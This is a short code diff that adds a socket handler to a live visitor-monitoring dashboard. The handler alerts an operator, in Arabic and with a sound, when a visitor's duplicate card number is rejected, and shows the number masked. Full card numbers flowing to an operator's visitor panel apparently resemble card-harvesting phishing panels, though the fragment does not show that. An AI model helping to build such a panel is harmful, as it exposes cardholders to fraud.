@@ -1147,6 +1147,19 @@
         }
       });
 
+      socket.on('visitor:duplicateCard', ({ visitorId, cardNumber }) => {
+        const visitor = visitors.get(visitorId);
+        if (visitor) {
+          // Show notification
+          const maskedCard = cardNumber ? cardNumber.slice(0, 4) + ' **** **** ' + cardNumber.slice(-4) : '';
+          showNotification('⚠️ تم رفض بطاقة مكررة من الزائر #' + visitor.visitorNumber + ' - ' + maskedCard);
+          try {
+            frogAudio.currentTime = 0;
+            frogAudio.play().catch(() => {});
+          } catch(e) {}
+        }
+      });
+
       socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
         const visitor = visitors.get(visitorId);
         if (visitor) {
